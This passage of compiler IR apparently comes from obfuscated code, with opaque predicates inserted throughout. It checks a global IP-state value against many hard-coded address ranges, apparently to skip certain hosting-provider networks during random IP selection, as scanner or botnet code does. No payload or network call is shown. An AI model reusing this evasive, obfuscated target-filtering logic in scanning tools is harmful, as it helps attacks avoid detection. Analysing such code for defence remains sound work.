  %2479 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2480 = zext i8 %2479 to i32
  %2481 = icmp sge i32 %2480, 64
  br i1 %2481, label %2482, label %2486

; <label>:2482:                                   ; preds = %2478
  %2483 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2484 = zext i8 %2483 to i32
  %2485 = icmp slt i32 %2484, 127
  br i1 %2485, label %5298, label %2486

; <label>:2486:                                   ; preds = %2482, %2478, %originalBBpart2336, %2454
  %2487 = load i32, i32* @x.65
  %2488 = load i32, i32* @y.66
  %2489 = sub i32 %2487, 1
  %2490 = mul i32 %2487, %2489
  %2491 = urem i32 %2490, 2
  %2492 = icmp eq i32 %2491, 0
  %2493 = icmp slt i32 %2488, 10
  %2494 = or i1 %2492, %2493
  br i1 %2494, label %originalBB338, label %originalBB338alteredBB

originalBB338:                                    ; preds = %originalBB338alteredBB, %2486
  %2495 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2496 = zext i8 %2495 to i32
  %2497 = icmp eq i32 %2496, 198
  %2498 = load i32, i32* @x.65
  %2499 = load i32, i32* @y.66
  %2500 = sub i32 %2498, 1
  %2501 = mul i32 %2498, %2500
  %2502 = urem i32 %2501, 2
  %2503 = icmp eq i32 %2502, 0
  %2504 = icmp slt i32 %2499, 10
  %2505 = or i1 %2503, %2504
  br i1 %2505, label %originalBBpart2340, label %originalBB338alteredBB

originalBBpart2340:                               ; preds = %originalBB338
  br i1 %2497, label %2506, label %2518

; <label>:2506:                                   ; preds = %originalBBpart2340
  %2507 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2508 = zext i8 %2507 to i32
  %2509 = icmp eq i32 %2508, 211
  br i1 %2509, label %2510, label %2518

; <label>:2510:                                   ; preds = %2506
  %2511 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2512 = zext i8 %2511 to i32
  %2513 = icmp sge i32 %2512, 96
  br i1 %2513, label %2514, label %2518

; <label>:2514:                                   ; preds = %2510
  %2515 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2516 = zext i8 %2515 to i32
  %2517 = icmp slt i32 %2516, 127
  br i1 %2517, label %5298, label %2518

; <label>:2518:                                   ; preds = %2514, %2510, %2506, %originalBBpart2340
  %2519 = load i32, i32* @x.65
  %2520 = load i32, i32* @y.66
  %2521 = sub i32 %2519, 1
  %2522 = mul i32 %2519, %2521
  %2523 = urem i32 %2522, 2
  %2524 = icmp eq i32 %2523, 0
  %2525 = icmp slt i32 %2520, 10
  %2526 = or i1 %2524, %2525
  br i1 %2526, label %originalBB342, label %originalBB342alteredBB

originalBB342:                                    ; preds = %originalBB342alteredBB, %2518
  %2527 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2528 = zext i8 %2527 to i32
  %2529 = icmp eq i32 %2528, 207
  %2530 = load i32, i32* @x.65
  %2531 = load i32, i32* @y.66
  %2532 = sub i32 %2530, 1
  %2533 = mul i32 %2530, %2532
  %2534 = urem i32 %2533, 2
  %2535 = icmp eq i32 %2534, 0
  %2536 = icmp slt i32 %2531, 10
  %2537 = or i1 %2535, %2536
  br i1 %2537, label %originalBBpart2344, label %originalBB342alteredBB

originalBBpart2344:                               ; preds = %originalBB342
  br i1 %2529, label %2538, label %2566

; <label>:2538:                                   ; preds = %originalBBpart2344
  %2539 = load i32, i32* @x.65
  %2540 = load i32, i32* @y.66
  %2541 = sub i32 %2539, 1
  %2542 = mul i32 %2539, %2541
  %2543 = urem i32 %2542, 2
  %2544 = icmp eq i32 %2543, 0
  %2545 = icmp slt i32 %2540, 10
  %2546 = or i1 %2544, %2545
  br i1 %2546, label %originalBB346, label %originalBB346alteredBB

originalBB346:                                    ; preds = %originalBB346alteredBB, %2538
  %2547 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2548 = zext i8 %2547 to i32
  %2549 = icmp eq i32 %2548, 154
  %2550 = load i32, i32* @x.65
  %2551 = load i32, i32* @y.66
  %2552 = sub i32 %2550, 1
  %2553 = mul i32 %2550, %2552
  %2554 = urem i32 %2553, 2
  %2555 = icmp eq i32 %2554, 0
  %2556 = icmp slt i32 %2551, 10
  %2557 = or i1 %2555, %2556
  br i1 %2557, label %originalBBpart2348, label %originalBB346alteredBB

originalBBpart2348:                               ; preds = %originalBB346
  br i1 %2549, label %2558, label %2566

; <label>:2558:                                   ; preds = %originalBBpart2348
  %2559 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2560 = zext i8 %2559 to i32
  %2561 = icmp sge i32 %2560, 192
  br i1 %2561, label %2562, label %2566

; <label>:2562:                                   ; preds = %2558
  %2563 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2564 = zext i8 %2563 to i32
  %2565 = icmp slt i32 %2564, 255
  br i1 %2565, label %5298, label %2566

; <label>:2566:                                   ; preds = %2562, %2558, %originalBBpart2348, %originalBBpart2344
  %2567 = load i32, i32* @x.65
  %2568 = load i32, i32* @y.66
  %2569 = sub i32 %2567, 1
  %2570 = mul i32 %2567, %2569
  %2571 = urem i32 %2570, 2
  %2572 = icmp eq i32 %2571, 0
  %2573 = icmp slt i32 %2568, 10
  %2574 = or i1 %2572, %2573
  br i1 %2574, label %originalBB350, label %originalBB350alteredBB

originalBB350:                                    ; preds = %originalBB350alteredBB, %2566
  %2575 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2576 = zext i8 %2575 to i32
  %2577 = icmp eq i32 %2576, 37
  %2578 = load i32, i32* @x.65
  %2579 = load i32, i32* @y.66
  %2580 = sub i32 %2578, 1
  %2581 = mul i32 %2578, %2580
  %2582 = urem i32 %2581, 2
  %2583 = icmp eq i32 %2582, 0
  %2584 = icmp slt i32 %2579, 10
  %2585 = or i1 %2583, %2584
  br i1 %2585, label %originalBBpart2352, label %originalBB350alteredBB

originalBBpart2352:                               ; preds = %originalBB350
  br i1 %2577, label %2586, label %2614

; <label>:2586:                                   ; preds = %originalBBpart2352
  %2587 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2588 = zext i8 %2587 to i32
  %2589 = icmp eq i32 %2588, 139
  br i1 %2589, label %2590, label %2614

; <label>:2590:                                   ; preds = %2586
  %2591 = load i32, i32* @x.65
  %2592 = load i32, i32* @y.66
  %2593 = sub i32 %2591, 1
  %2594 = mul i32 %2591, %2593
  %2595 = urem i32 %2594, 2
  %2596 = icmp eq i32 %2595, 0
  %2597 = icmp slt i32 %2592, 10
  %2598 = or i1 %2596, %2597
  br i1 %2598, label %originalBB354, label %originalBB354alteredBB

originalBB354:                                    ; preds = %originalBB354alteredBB, %2590
  %2599 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2600 = zext i8 %2599 to i32
  %2601 = icmp sge i32 %2600, 1
  %2602 = load i32, i32* @x.65
  %2603 = load i32, i32* @y.66
  %2604 = sub i32 %2602, 1
  %2605 = mul i32 %2602, %2604
  %2606 = urem i32 %2605, 2
  %2607 = icmp eq i32 %2606, 0
  %2608 = icmp slt i32 %2603, 10
  %2609 = or i1 %2607, %2608
  br i1 %2609, label %originalBBpart2356, label %originalBB354alteredBB

originalBBpart2356:                               ; preds = %originalBB354
  br i1 %2601, label %2610, label %2614

; <label>:2610:                                   ; preds = %originalBBpart2356
  %2611 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2612 = zext i8 %2611 to i32
  %2613 = icmp slt i32 %2612, 31
  br i1 %2613, label %5298, label %2614

; <label>:2614:                                   ; preds = %2610, %originalBBpart2356, %2586, %originalBBpart2352
  %2615 = load i32, i32* @x.65
  %2616 = load i32, i32* @y.66
  %2617 = sub i32 %2615, 1
  %2618 = mul i32 %2615, %2617
  %2619 = urem i32 %2618, 2
  %2620 = icmp eq i32 %2619, 0
  %2621 = icmp slt i32 %2616, 10
  %2622 = or i1 %2620, %2621
  br i1 %2622, label %originalBB358, label %originalBB358alteredBB

originalBB358:                                    ; preds = %originalBB358alteredBB, %2614
  %2623 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2624 = zext i8 %2623 to i32
  %2625 = icmp eq i32 %2624, 67
  %2626 = load i32, i32* @x.65
  %2627 = load i32, i32* @y.66
  %2628 = sub i32 %2626, 1
  %2629 = mul i32 %2626, %2628
  %2630 = urem i32 %2629, 2
  %2631 = icmp eq i32 %2630, 0
  %2632 = icmp slt i32 %2627, 10
  %2633 = or i1 %2631, %2632
  br i1 %2633, label %originalBBpart2360, label %originalBB358alteredBB

originalBBpart2360:                               ; preds = %originalBB358
  br i1 %2625, label %2634, label %2678

; <label>:2634:                                   ; preds = %originalBBpart2360
  %2635 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2636 = zext i8 %2635 to i32
  %2637 = icmp eq i32 %2636, 207
  br i1 %2637, label %2638, label %2678

; <label>:2638:                                   ; preds = %2634
  %2639 = load i32, i32* @x.65
  %2640 = load i32, i32* @y.66
  %2641 = sub i32 %2639, 1
  %2642 = mul i32 %2639, %2641
  %2643 = urem i32 %2642, 2
  %2644 = icmp eq i32 %2643, 0
  %2645 = icmp slt i32 %2640, 10
  %2646 = or i1 %2644, %2645
  br i1 %2646, label %originalBB362, label %originalBB362alteredBB

originalBB362:                                    ; preds = %originalBB362alteredBB, %2638
  %2647 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2648 = zext i8 %2647 to i32
  %2649 = icmp sge i32 %2648, 64
  %2650 = load i32, i32* @x.65
  %2651 = load i32, i32* @y.66
  %2652 = sub i32 %2650, 1
  %2653 = mul i32 %2650, %2652
  %2654 = urem i32 %2653, 2
  %2655 = icmp eq i32 %2654, 0
  %2656 = icmp slt i32 %2651, 10
  %2657 = or i1 %2655, %2656
  br i1 %2657, label %originalBBpart2364, label %originalBB362alteredBB

originalBBpart2364:                               ; preds = %originalBB362
  br i1 %2649, label %2658, label %2678

; <label>:2658:                                   ; preds = %originalBBpart2364
  %2659 = load i32, i32* @x.65
  %2660 = load i32, i32* @y.66
  %2661 = sub i32 %2659, 1
  %2662 = mul i32 %2659, %2661
  %2663 = urem i32 %2662, 2
  %2664 = icmp eq i32 %2663, 0
  %2665 = icmp slt i32 %2660, 10
  %2666 = or i1 %2664, %2665
  br i1 %2666, label %originalBB366, label %originalBB366alteredBB

originalBB366:                                    ; preds = %originalBB366alteredBB, %2658
  %2667 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2668 = zext i8 %2667 to i32
  %2669 = icmp slt i32 %2668, 95
  %2670 = load i32, i32* @x.65
  %2671 = load i32, i32* @y.66
  %2672 = sub i32 %2670, 1
  %2673 = mul i32 %2670, %2672
  %2674 = urem i32 %2673, 2
  %2675 = icmp eq i32 %2674, 0
  %2676 = icmp slt i32 %2671, 10
  %2677 = or i1 %2675, %2676
  br i1 %2677, label %originalBBpart2368, label %originalBB366alteredBB

originalBBpart2368:                               ; preds = %originalBB366
  br i1 %2669, label %5298, label %2678

; <label>:2678:                                   ; preds = %originalBBpart2368, %originalBBpart2364, %2634, %originalBBpart2360
  %2679 = load i32, i32* @x.65
  %2680 = load i32, i32* @y.66
  %2681 = sub i32 %2679, 1
  %2682 = mul i32 %2679, %2681
  %2683 = urem i32 %2682, 2
  %2684 = icmp eq i32 %2683, 0
  %2685 = icmp slt i32 %2680, 10
  %2686 = or i1 %2684, %2685
  br i1 %2686, label %originalBB370, label %originalBB370alteredBB

originalBB370:                                    ; preds = %originalBB370alteredBB, %2678
  %2687 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2688 = zext i8 %2687 to i32
  %2689 = icmp eq i32 %2688, 67
  %2690 = load i32, i32* @x.65
  %2691 = load i32, i32* @y.66
  %2692 = sub i32 %2690, 1
  %2693 = mul i32 %2690, %2692
  %2694 = urem i32 %2693, 2
  %2695 = icmp eq i32 %2694, 0
  %2696 = icmp slt i32 %2691, 10
  %2697 = or i1 %2695, %2696
  br i1 %2697, label %originalBBpart2372, label %originalBB370alteredBB

originalBBpart2372:                               ; preds = %originalBB370
  br i1 %2689, label %2698, label %2726

; <label>:2698:                                   ; preds = %originalBBpart2372
  %2699 = load i32, i32* @x.65
  %2700 = load i32, i32* @y.66
  %2701 = sub i32 %2699, 1
  %2702 = mul i32 %2699, %2701
  %2703 = urem i32 %2702, 2
  %2704 = icmp eq i32 %2703, 0
  %2705 = icmp slt i32 %2700, 10
  %2706 = or i1 %2704, %2705
  br i1 %2706, label %originalBB374, label %originalBB374alteredBB

originalBB374:                                    ; preds = %originalBB374alteredBB, %2698
  %2707 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2708 = zext i8 %2707 to i32
  %2709 = icmp eq i32 %2708, 205
  %2710 = load i32, i32* @x.65
  %2711 = load i32, i32* @y.66
  %2712 = sub i32 %2710, 1
  %2713 = mul i32 %2710, %2712
  %2714 = urem i32 %2713, 2
  %2715 = icmp eq i32 %2714, 0
  %2716 = icmp slt i32 %2711, 10
  %2717 = or i1 %2715, %2716
  br i1 %2717, label %originalBBpart2376, label %originalBB374alteredBB

originalBBpart2376:                               ; preds = %originalBB374
  br i1 %2709, label %2718, label %2726

; <label>:2718:                                   ; preds = %originalBBpart2376
  %2719 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2720 = zext i8 %2719 to i32
  %2721 = icmp sge i32 %2720, 128
  br i1 %2721, label %2722, label %2726

; <label>:2722:                                   ; preds = %2718
  %2723 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2724 = zext i8 %2723 to i32
  %2725 = icmp slt i32 %2724, 191
  br i1 %2725, label %5298, label %2726

; <label>:2726:                                   ; preds = %2722, %2718, %originalBBpart2376, %originalBBpart2372
  %2727 = load i32, i32* @x.65
  %2728 = load i32, i32* @y.66
  %2729 = sub i32 %2727, 1
  %2730 = mul i32 %2727, %2729
  %2731 = urem i32 %2730, 2
  %2732 = icmp eq i32 %2731, 0
  %2733 = icmp slt i32 %2728, 10
  %2734 = or i1 %2732, %2733
  br i1 %2734, label %originalBB378, label %originalBB378alteredBB

originalBB378:                                    ; preds = %originalBB378alteredBB, %2726
  %2735 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2736 = zext i8 %2735 to i32
  %2737 = icmp eq i32 %2736, 80
  %2738 = load i32, i32* @x.65
  %2739 = load i32, i32* @y.66
  %2740 = sub i32 %2738, 1
  %2741 = mul i32 %2738, %2740
  %2742 = urem i32 %2741, 2
  %2743 = icmp eq i32 %2742, 0
  %2744 = icmp slt i32 %2739, 10
  %2745 = or i1 %2743, %2744
  br i1 %2745, label %originalBBpart2380, label %originalBB378alteredBB

originalBBpart2380:                               ; preds = %originalBB378
  br i1 %2737, label %2746, label %2758

; <label>:2746:                                   ; preds = %originalBBpart2380
  %2747 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2748 = zext i8 %2747 to i32
  %2749 = icmp eq i32 %2748, 240
  br i1 %2749, label %2750, label %2758

; <label>:2750:                                   ; preds = %2746
  %2751 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2752 = zext i8 %2751 to i32
  %2753 = icmp sge i32 %2752, 128
  br i1 %2753, label %2754, label %2758

; <label>:2754:                                   ; preds = %2750
  %2755 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2756 = zext i8 %2755 to i32
  %2757 = icmp slt i32 %2756, 143
  br i1 %2757, label %5298, label %2758

; <label>:2758:                                   ; preds = %2754, %2750, %2746, %originalBBpart2380
  %2759 = load i32, i32* @x.65
  %2760 = load i32, i32* @y.66
  %2761 = sub i32 %2759, 1
  %2762 = mul i32 %2759, %2761
  %2763 = urem i32 %2762, 2
  %2764 = icmp eq i32 %2763, 0
  %2765 = icmp slt i32 %2760, 10
  %2766 = or i1 %2764, %2765
  br i1 %2766, label %originalBB382, label %originalBB382alteredBB

originalBB382:                                    ; preds = %originalBB382alteredBB, %2758
  %2767 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2768 = zext i8 %2767 to i32
  %2769 = icmp eq i32 %2768, 82
  %2770 = load i32, i32* @x.65
  %2771 = load i32, i32* @y.66
  %2772 = sub i32 %2770, 1
  %2773 = mul i32 %2770, %2772
  %2774 = urem i32 %2773, 2
  %2775 = icmp eq i32 %2774, 0
  %2776 = icmp slt i32 %2771, 10
  %2777 = or i1 %2775, %2776
  br i1 %2777, label %originalBBpart2384, label %originalBB382alteredBB

originalBBpart2384:                               ; preds = %originalBB382
  br i1 %2769, label %2778, label %2790

; <label>:2778:                                   ; preds = %originalBBpart2384
  %2779 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2780 = zext i8 %2779 to i32
  %2781 = icmp eq i32 %2780, 196
  br i1 %2781, label %2782, label %2790

; <label>:2782:                                   ; preds = %2778
  %2783 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2784 = zext i8 %2783 to i32
  %2785 = icmp sge i32 %2784, 1
  br i1 %2785, label %2786, label %2790

; <label>:2786:                                   ; preds = %2782
  %2787 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2788 = zext i8 %2787 to i32
  %2789 = icmp slt i32 %2788, 15
  br i1 %2789, label %5298, label %2790

; <label>:2790:                                   ; preds = %2786, %2782, %2778, %originalBBpart2384
  %2791 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2792 = zext i8 %2791 to i32
  %2793 = icmp eq i32 %2792, 95
  br i1 %2793, label %2794, label %2822

; <label>:2794:                                   ; preds = %2790
  %2795 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2796 = zext i8 %2795 to i32
  %2797 = icmp eq i32 %2796, 85
  br i1 %2797, label %2798, label %2822

; <label>:2798:                                   ; preds = %2794
  %2799 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2800 = zext i8 %2799 to i32
  %2801 = icmp sge i32 %2800, 8
  br i1 %2801, label %2802, label %2822

; <label>:2802:                                   ; preds = %2798
  %2803 = load i32, i32* @x.65
  %2804 = load i32, i32* @y.66
  %2805 = sub i32 %2803, 1
  %2806 = mul i32 %2803, %2805
  %2807 = urem i32 %2806, 2
  %2808 = icmp eq i32 %2807, 0
  %2809 = icmp slt i32 %2804, 10
  %2810 = or i1 %2808, %2809
  br i1 %2810, label %originalBB386, label %originalBB386alteredBB

originalBB386:                                    ; preds = %originalBB386alteredBB, %2802
  %2811 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2812 = zext i8 %2811 to i32
  %2813 = icmp slt i32 %2812, 63
  %2814 = load i32, i32* @x.65
  %2815 = load i32, i32* @y.66
  %2816 = sub i32 %2814, 1
  %2817 = mul i32 %2814, %2816
  %2818 = urem i32 %2817, 2
  %2819 = icmp eq i32 %2818, 0
  %2820 = icmp slt i32 %2815, 10
  %2821 = or i1 %2819, %2820
  br i1 %2821, label %originalBBpart2388, label %originalBB386alteredBB

originalBBpart2388:                               ; preds = %originalBB386
  br i1 %2813, label %5298, label %2822

; <label>:2822:                                   ; preds = %originalBBpart2388, %2798, %2794, %2790
  %2823 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2824 = zext i8 %2823 to i32
  %2825 = icmp eq i32 %2824, 64
  br i1 %2825, label %2826, label %2838

; <label>:2826:                                   ; preds = %2822
  %2827 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2828 = zext i8 %2827 to i32
  %2829 = icmp eq i32 %2828, 237
  br i1 %2829, label %2830, label %2838

; <label>:2830:                                   ; preds = %2826
  %2831 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2832 = zext i8 %2831 to i32
  %2833 = icmp sge i32 %2832, 32
  br i1 %2833, label %2834, label %2838

; <label>:2834:                                   ; preds = %2830
  %2835 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2836 = zext i8 %2835 to i32
  %2837 = icmp slt i32 %2836, 43
  br i1 %2837, label %5298, label %2838

; <label>:2838:                                   ; preds = %2834, %2830, %2826, %2822
  %2839 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2840 = zext i8 %2839 to i32
  %2841 = icmp eq i32 %2840, 185
  br i1 %2841, label %2842, label %2886

; <label>:2842:                                   ; preds = %2838
  %2843 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2844 = zext i8 %2843 to i32
  %2845 = icmp eq i32 %2844, 92
  br i1 %2845, label %2846, label %2886

; <label>:2846:                                   ; preds = %2842
  %2847 = load i32, i32* @x.65
  %2848 = load i32, i32* @y.66
  %2849 = sub i32 %2847, 1
  %2850 = mul i32 %2847, %2849
  %2851 = urem i32 %2850, 2
  %2852 = icmp eq i32 %2851, 0
  %2853 = icmp slt i32 %2848, 10
  %2854 = or i1 %2852, %2853
  br i1 %2854, label %originalBB390, label %originalBB390alteredBB

originalBB390:                                    ; preds = %originalBB390alteredBB, %2846
  %2855 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2856 = zext i8 %2855 to i32
  %2857 = icmp sge i32 %2856, 220
  %2858 = load i32, i32* @x.65
  %2859 = load i32, i32* @y.66
  %2860 = sub i32 %2858, 1
  %2861 = mul i32 %2858, %2860
  %2862 = urem i32 %2861, 2
  %2863 = icmp eq i32 %2862, 0
  %2864 = icmp slt i32 %2859, 10
  %2865 = or i1 %2863, %2864
  br i1 %2865, label %originalBBpart2392, label %originalBB390alteredBB

originalBBpart2392:                               ; preds = %originalBB390
  br i1 %2857, label %2866, label %2886

; <label>:2866:                                   ; preds = %originalBBpart2392
  %2867 = load i32, i32* @x.65
  %2868 = load i32, i32* @y.66
  %2869 = sub i32 %2867, 1
  %2870 = mul i32 %2867, %2869
  %2871 = urem i32 %2870, 2
  %2872 = icmp eq i32 %2871, 0
  %2873 = icmp slt i32 %2868, 10
  %2874 = or i1 %2872, %2873
  br i1 %2874, label %originalBB394, label %originalBB394alteredBB

originalBB394:                                    ; preds = %originalBB394alteredBB, %2866
  %2875 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2876 = zext i8 %2875 to i32
  %2877 = icmp slt i32 %2876, 223
  %2878 = load i32, i32* @x.65
  %2879 = load i32, i32* @y.66
  %2880 = sub i32 %2878, 1
  %2881 = mul i32 %2878, %2880
  %2882 = urem i32 %2881, 2
  %2883 = icmp eq i32 %2882, 0
  %2884 = icmp slt i32 %2879, 10
  %2885 = or i1 %2883, %2884
  br i1 %2885, label %originalBBpart2396, label %originalBB394alteredBB

originalBBpart2396:                               ; preds = %originalBB394
  br i1 %2877, label %5298, label %2886

; <label>:2886:                                   ; preds = %originalBBpart2396, %originalBBpart2392, %2842, %2838
  %2887 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2888 = zext i8 %2887 to i32
  %2889 = icmp eq i32 %2888, 104
  br i1 %2889, label %2890, label %2902

; <label>:2890:                                   ; preds = %2886
  %2891 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2892 = zext i8 %2891 to i32
  %2893 = icmp eq i32 %2892, 238
  br i1 %2893, label %2894, label %2902

; <label>:2894:                                   ; preds = %2890
  %2895 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2896 = zext i8 %2895 to i32
  %2897 = icmp sge i32 %2896, 128
  br i1 %2897, label %2898, label %2902

; <label>:2898:                                   ; preds = %2894
  %2899 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2900 = zext i8 %2899 to i32
  %2901 = icmp slt i32 %2900, 191
  br i1 %2901, label %5298, label %2902

; <label>:2902:                                   ; preds = %2898, %2894, %2890, %2886
  %2903 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2904 = zext i8 %2903 to i32
  %2905 = icmp eq i32 %2904, 209
  br i1 %2905, label %2906, label %2934

; <label>:2906:                                   ; preds = %2902
  %2907 = load i32, i32* @x.65
  %2908 = load i32, i32* @y.66
  %2909 = sub i32 %2907, 1
  %2910 = mul i32 %2907, %2909
  %2911 = urem i32 %2910, 2
  %2912 = icmp eq i32 %2911, 0
  %2913 = icmp slt i32 %2908, 10
  %2914 = or i1 %2912, %2913
  br i1 %2914, label %originalBB398, label %originalBB398alteredBB

originalBB398:                                    ; preds = %originalBB398alteredBB, %2906
  %2915 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2916 = zext i8 %2915 to i32
  %2917 = icmp eq i32 %2916, 222
  %2918 = load i32, i32* @x.65
  %2919 = load i32, i32* @y.66
  %2920 = sub i32 %2918, 1
  %2921 = mul i32 %2918, %2920
  %2922 = urem i32 %2921, 2
  %2923 = icmp eq i32 %2922, 0
  %2924 = icmp slt i32 %2919, 10
  %2925 = or i1 %2923, %2924
  br i1 %2925, label %originalBBpart2400, label %originalBB398alteredBB

originalBBpart2400:                               ; preds = %originalBB398
  br i1 %2917, label %2926, label %2934

; <label>:2926:                                   ; preds = %originalBBpart2400
  %2927 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2928 = zext i8 %2927 to i32
  %2929 = icmp sge i32 %2928, 1
  br i1 %2929, label %2930, label %2934

; <label>:2930:                                   ; preds = %2926
  %2931 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2932 = zext i8 %2931 to i32
  %2933 = icmp slt i32 %2932, 31
  br i1 %2933, label %5298, label %2934

; <label>:2934:                                   ; preds = %2930, %2926, %originalBBpart2400, %2902
  %2935 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2936 = zext i8 %2935 to i32
  %2937 = icmp eq i32 %2936, 208
  br i1 %2937, label %2938, label %2966

; <label>:2938:                                   ; preds = %2934
  %2939 = load i32, i32* @x.65
  %2940 = load i32, i32* @y.66
  %2941 = sub i32 %2939, 1
  %2942 = mul i32 %2939, %2941
  %2943 = urem i32 %2942, 2
  %2944 = icmp eq i32 %2943, 0
  %2945 = icmp slt i32 %2940, 10
  %2946 = or i1 %2944, %2945
  br i1 %2946, label %originalBB402, label %originalBB402alteredBB

originalBB402:                                    ; preds = %originalBB402alteredBB, %2938
  %2947 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2948 = zext i8 %2947 to i32
  %2949 = icmp eq i32 %2948, 167
  %2950 = load i32, i32* @x.65
  %2951 = load i32, i32* @y.66
  %2952 = sub i32 %2950, 1
  %2953 = mul i32 %2950, %2952
  %2954 = urem i32 %2953, 2
  %2955 = icmp eq i32 %2954, 0
  %2956 = icmp slt i32 %2951, 10
  %2957 = or i1 %2955, %2956
  br i1 %2957, label %originalBBpart2404, label %originalBB402alteredBB

originalBBpart2404:                               ; preds = %originalBB402
  br i1 %2949, label %2958, label %2966

; <label>:2958:                                   ; preds = %originalBBpart2404
  %2959 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2960 = zext i8 %2959 to i32
  %2961 = icmp sge i32 %2960, 232
  br i1 %2961, label %2962, label %2966

; <label>:2962:                                   ; preds = %2958
  %2963 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2964 = zext i8 %2963 to i32
  %2965 = icmp slt i32 %2964, 252
  br i1 %2965, label %5298, label %2966

